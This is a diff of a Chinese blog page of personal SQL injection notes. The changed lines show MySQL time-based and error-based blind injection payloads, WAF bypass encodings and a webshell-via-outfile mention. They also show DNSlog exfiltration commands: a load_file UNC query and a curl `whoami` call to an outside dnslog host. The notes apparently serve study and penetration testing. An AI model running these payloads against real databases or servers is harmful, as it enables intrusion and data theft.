@@ -17,7 +17,7 @@
 <meta property="og:description" content="任何通过用户输入返回数据的地方都可能存在注入, 观察网址的url, 登陆点等。 有的会对$_POST, $_GET进行过滤, 却忽略了$_COOKIE, 如果后端有参数使用的是$_REQUEST 可以尝试cookie注入。 cookie注入 原本url为 id &#x3D; 1 我们get不写id参数, 在cookie中添加id参数。 用 REQUEST 接收值时, 服务器先检查 GET POST,  都没">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2020-02-20T03:06:15.000Z">
-<meta property="article:modified_time" content="2020-07-01T06:29:37.305Z">
+<meta property="article:modified_time" content="2020-07-05T08:40:25.381Z">
 <meta property="article:author" content="li9hu">
 <meta property="article:tag" content="php">
 <meta property="article:tag" content="sql">
@@ -371,7 +371,7 @@ ERROR 1105 (HY000): XPATH syntax error: '.28-0ubuntu0.18.04.4'
 </code></pre>
 <h3 id="时间注入">时间注入</h3>
 <p><strong>sleep</strong></p>
-<pre><code class="language-mysql">mysql&gt; select 1 and if(mid(version(),1,1)=5, sleep(4), 1);
+<pre><code class="language-sql">mysql&gt; select 1 and if(mid(version(),1,1)=5, sleep(4), 1);
 +---------------------------------------------+
 | 1 and if(mid(version(),1,1)=5, sleep(4), 1) |
 +---------------------------------------------+
@@ -381,7 +381,7 @@ ERROR 1105 (HY000): XPATH syntax error: '.28-0ubuntu0.18.04.4'
 </code></pre>
 <p><strong>benchmark</strong><br>
 对第二个参数函数重复执行N次,</p>
-<pre><code class="language-mysql">mysql&gt; select benchmark(10000000, md5(3));
+<pre><code class="language-sql">mysql&gt; select benchmark(10000000, md5(3));
 
 +-----------------------------+
 | benchmark(10000000, md5(3)) |
@@ -391,7 +391,7 @@ ERROR 1105 (HY000): XPATH syntax error: '.28-0ubuntu0.18.04.4'
 1 row in set (3.42 sec)
 </code></pre>
 <p><strong>笛卡尔积大量运算</strong></p>
-<pre><code class="language-mysql">mysql&gt; select count(*) from information_schema.tables as A , information_schema.columns as V, information_schema.files as c;
+<pre><code class="language-sql">mysql&gt; select count(*) from information_schema.tables as A , information_schema.columns as V, information_schema.files as c;
 +----------+
 | count(*) |
 +----------+
@@ -443,10 +443,10 @@ else:
 由于基于SMB请求，用UNC路径, 需要在Windows环境下才能利用<br>
 secure_file_priv未设置值<br>
 通过dnsbin来做dns服务器, 解析一次后需要更换2级域名字符。</p>
-<pre><code>mysql&gt; select load_file(concat('\\\\',(select version()),'.a.e588dbb9beddd85f974a.d.zhack.ca//dddd'));
+<pre><code class="language-sql">mysql&gt; select load_file(concat('\\\\',(select version()),'.a.e588dbb9beddd85f974a.d.zhack.ca//dddd'));
 </code></pre>
 <p>同时DNSlog可以用于命令无回显的注入</p>
-<pre><code>curl  `whoami`.e588dbb9beddd85f974a.d.zhack.ca
+<pre><code class="language-shell">curl  `whoami`.e588dbb9beddd85f974a.d.zhack.ca
 </code></pre>
 <h3 id="mysql写webshell">mysql写webshell</h3>
 <ol start="5">
@@ -469,7 +469,7 @@ id = 1 limit 1  into outfile '&lt;?php ...?&gt;' lines starting by '/var...';
 </code></pre>
 <h3 id="LIMIT-ORDERBY-注入">LIMIT, ORDERBY 注入</h3>
 <p>如果只有limit, 可以直接使用union拼接查询(mysql&lt;5.6.6)</p>
-<pre><code class="language-mysql">mysql&gt; select 1  limit 0,1 union select  version();
+<pre><code class="language-sql">mysql&gt; select 1  limit 0,1 union select  version();
 +-------------------------+
 | 1                       |
 +-------------------------+
@@ -478,19 +478,19 @@ id = 1 limit 1  into outfile '&lt;?php ...?&gt;' lines starting by '/var...';
 +-------------------------+
 </code></pre>
 <p>如果存在order by则无法利用</p>
-<pre><code class="language-mysql">mysql&gt; select 1  order by 1 limit 0,1 union select  version();
+<pre><code class="language-sql">mysql&gt; select 1  order by 1 limit 0,1 union select  version();
 ERROR 1221 (HY000): Incorrect usage of UNION and ORDER BY
 </code></pre>
 <p>只存在order by, 采用<code>if like</code> 出数据.(不受mysql数据库版本限制)</p>
-<pre><code class="language-mysql">
+<pre><code class="language-sql">
 select id from msg order by if(mid(version(),1,1) like 5, sleep(2), 1)
 </code></pre>
 <p>存在order by 和limit 采用<code>procedure analyse</code>配合<code>extractvalue</code>进行报错注入(MySQL&lt;5.6.6)</p>
-<pre><code class="language-mysql">mysql&gt; select * from msg order by 1 limit 1,1 procedure analyse(extractvalue(1, concat(0x7e, database(), 0x7e)),1);
+<pre><code class="language-sql">mysql&gt; select * from msg order by 1 limit 1,1 procedure analyse(extractvalue(1, concat(0x7e, database(), 0x7e)),1);
 ERROR 1105 (HY000): XPATH syntax error: '~user~'
 </code></pre>
 <p>若无回显采用盲注, sleep无法使用 采用benchmark来延时。</p>
-<pre><code>mysql&gt; select * from msg order by 1 limit 1,1 procedure analyse(extractvalue(1, concat(0x7e, if(mid(version(),1,1) like 5, benchmark(10000000,md5(1)), 1), 0x7e)),1);
+<pre><code class="language-sql">mysql&gt; select * from msg order by 1 limit 1,1 procedure analyse(extractvalue(1, concat(0x7e, if(mid(version(),1,1) like 5, benchmark(10000000,md5(1)), 1), 0x7e)),1);
 </code></pre>
 <h3 id="二次注入">二次注入</h3>
 <p>数据第一次存入的时候对特殊字符进行了转义带入数据库, 但是存入数据库的数据并没有被转义还是脏数据。 所以如果存在从数据库中取数据拼接SQL操作的话就会造成二次注入。</p>
@@ -498,17 +498,17 @@ ERROR 1105 (HY000): XPATH syntax error: '~user~'
 <p>不要使用不安全的字符编码<code>gbk</code><br>
 启用<code>NO_BACKSLASH_ESCAPESSQL</code>模式, 反斜杠当作普通字符，而不是转义字符。</p>
 <h3 id="SQL-绕WAF">SQL 绕WAF</h3>
-<p>OR =&gt; <code>||</code> <code>where 1=2 || 1=1</code><br>
-AND =&gt; <code>&amp;&amp;</code> <code>where 1=1 &amp; 1=2</code><br>
-空格 =&gt; <code>+</code> <code>where+1=1+&amp;&amp;1=2</code></p>
-<p>采用url编码绕过检测 <code>%53elect 1;</code> <code>%44nion %53select 1; </code></p>
+<p><code>OR</code> =&gt; <code>||</code> 例 <code>where 1=2 || 1=1</code><br>
+<code>AND</code> =&gt; <code>&amp;&amp;</code> 例 <code>where 1=1 &amp; 1=2</code><br>
+<code>空格</code> =&gt; <code>+</code> 例  <code>where+1=1+&amp;&amp;1=2</code><br>
+采用url编码绕过检测 <code>%53elect 1;</code> 例: <code>%44nion %53select 1; </code></p>
 <p><strong>IIS+ASP</strong>环境中, 对于URL请求的参数值中的%，如果和后面的字符构成的字符串在 URL编码表 之外，ASP脚本处理时会将其忽略, 而云WAF不会, 从而绕过检测。</p>
-<pre><code class="language-mysql">se%lect 1 f%rom a --+  云WAF检测不到可疑参数
+<pre><code class="language-sql">se%lect 1 f%rom a --+  云WAF检测不到可疑参数
 select 1 from a --+    ASP忽略%重新组合成payload
 </code></pre>
 <p>过滤了单引号逗号,采用<br>
 <code>case when substr(... from .. for .. ) = .. then .. else .. end</code></p>
-<pre><code class="language-mysql">mysql&gt; select 1 from msg  union select  case when  1=1 then sleep(1) else 2 end;
+<pre><code class="language-sql">mysql&gt; select 1 from msg  union select  case when  1=1 then sleep(1) else 2 end;
 +---+
 | 1 |
 +---+
@@ -517,7 +517,7 @@ select 1 from a --+    ASP忽略%重新组合成payload
 +---+
 2 rows in set (1.01 sec)
 </code></pre>
-<pre><code class="language-mysql">mysql&gt; select   case   when  (select substr(database(),1,1) )=65 then sleep(3) else 2 end;
+<pre><code class="language-sql">mysql&gt; select   case   when  (select substr(database(),1,1) )=65 then sleep(3) else 2 end;
 +---------------------------------------------------------------------------+
 | case   when  (select substr(database(),1,1) )=65 then sleep(3) else 2 end |
 +---------------------------------------------------------------------------+
@@ -535,7 +535,7 @@ select 1 from a --+    ASP忽略%重新组合成payload
         <p><span>本文标题:</span><a  href="/2020/02/%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></p>
         <p><span>文章作者:</span><a  href="/" title="访问 li9hu 的个人博客">li9hu</a></p>
         <p><span>发布时间:</span>2020年02月20日 - 11时06分</p>
-        <p><span>最后更新:</span>2020年07月01日 - 14时29分</p>
+        <p><span>最后更新:</span>2020年07月05日 - 16时40分</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2020/02/%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5/" title="SQL注入">http://yoursite.com/2020/02/%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5/</a>
             <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2020/02/%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5/　　作者: li9hu" title=""></span>
@@ -633,7 +633,7 @@ select 1 from a --+    ASP忽略%重新组合成payload
             </a>
         
     </div>
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/07/%E7%AC%94%E8%AE%B0/XSS%E8%AE%B0%E5%BD%95/">XSS记录.md</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/%E7%AC%94%E8%AE%B0/java%E5%8F%8D%E5%B0%84/">java反射</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/%E7%AC%94%E8%AE%B0/java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/">java类加载器</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABGetShell/">通达OA任意文件上传/文件包含GetShell</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/%E7%AC%94%E8%AE%B0/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">python反序列化</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/PhpMyAdmin%E7%94%A8%E6%88%B7%E7%95%8C%E9%9D%A2%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5/">PhpMyAdmin用户界面存在SQL注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/%E7%AC%94%E8%AE%B0/socket%E7%BC%96%E6%88%90/">socket编成</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/%E7%AC%94%E8%AE%B0/python%E5%B8%A6%E9%A2%9C%E8%89%B2%E8%BE%93%E5%87%BA/">python带颜色输出</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/%E7%AC%94%E8%AE%B0/http%E7%8A%B6%E6%80%81%E7%A0%81/">http状态码</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/%E7%AC%94%E8%AE%B0/sql%E6%93%8D%E4%BD%9C/">sql操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/">入侵检测</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Thinkphp5x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">Thinkphp5x远程代码执行</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/%E7%AC%94%E8%AE%B0/Docker%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/">Docker使用记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/%E7%AC%94%E8%AE%B0/%E7%88%AC%E8%99%AB%E8%AE%B0%E5%BD%95%EF%BC%8C%E7%BC%96%E5%86%99%E4%BB%A3%E7%90%86%E6%B1%A0/">爬虫记录, 编写代理池</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/duomi3-0%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-GetShell/">duomi3.0变量覆盖/GetShell</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/">discuzx3.4任意文件删除</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/discuz%206-7%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E9%98%B2%E5%BE%A1%E7%BB%95/">discuz 6.*/7.*全局变量防御绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/%E6%B8%97%E9%80%8F/%E5%85%B3%E4%BA%8EPhar%E7%9A%84%E6%80%BB%E7%BB%93/">关于Phar的总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/%E6%B8%97%E9%80%8F/disable-function%E7%BB%95%E8%BF%87/">disable_function绕过</a></li></ul>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/07/%E7%AC%94%E8%AE%B0/%E9%9B%B6%E7%A2%8E%E8%AE%B0%E5%BD%95/">零碎记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/%E7%AC%94%E8%AE%B0/XSS%E8%AE%B0%E5%BD%95/">XSS记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/%E7%AC%94%E8%AE%B0/java%E5%8F%8D%E5%B0%84/">java反射</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/%E7%AC%94%E8%AE%B0/java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/">java类加载器</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABGetShell/">通达OA任意文件上传/文件包含GetShell</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/%E7%AC%94%E8%AE%B0/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">python反序列化</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/PhpMyAdmin%E7%94%A8%E6%88%B7%E7%95%8C%E9%9D%A2%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5/">PhpMyAdmin用户界面存在SQL注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/%E7%AC%94%E8%AE%B0/socket%E7%BC%96%E6%88%90/">socket编成</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/%E7%AC%94%E8%AE%B0/python%E5%B8%A6%E9%A2%9C%E8%89%B2%E8%BE%93%E5%87%BA/">python带颜色输出</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/%E7%AC%94%E8%AE%B0/http%E7%8A%B6%E6%80%81%E7%A0%81/">http状态码</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/%E7%AC%94%E8%AE%B0/sql%E6%93%8D%E4%BD%9C/">sql操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/">入侵检测</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Thinkphp5x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">Thinkphp5x远程代码执行</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/%E7%AC%94%E8%AE%B0/Docker%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/">Docker使用记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/%E7%AC%94%E8%AE%B0/%E7%88%AC%E8%99%AB%E8%AE%B0%E5%BD%95%EF%BC%8C%E7%BC%96%E5%86%99%E4%BB%A3%E7%90%86%E6%B1%A0/">爬虫记录, 编写代理池</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/duomi3-0%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-GetShell/">duomi3.0变量覆盖/GetShell</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/">discuzx3.4任意文件删除</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/discuz%206-7%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E9%98%B2%E5%BE%A1%E7%BB%95/">discuz 6.*/7.*全局变量防御绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/%E6%B8%97%E9%80%8F/%E5%85%B3%E4%BA%8EPhar%E7%9A%84%E6%80%BB%E7%BB%93/">关于Phar的总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/%E6%B8%97%E9%80%8F/disable-function%E7%BB%95%E8%BF%87/">disable_function绕过</a></li></ul>
     
 <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
 
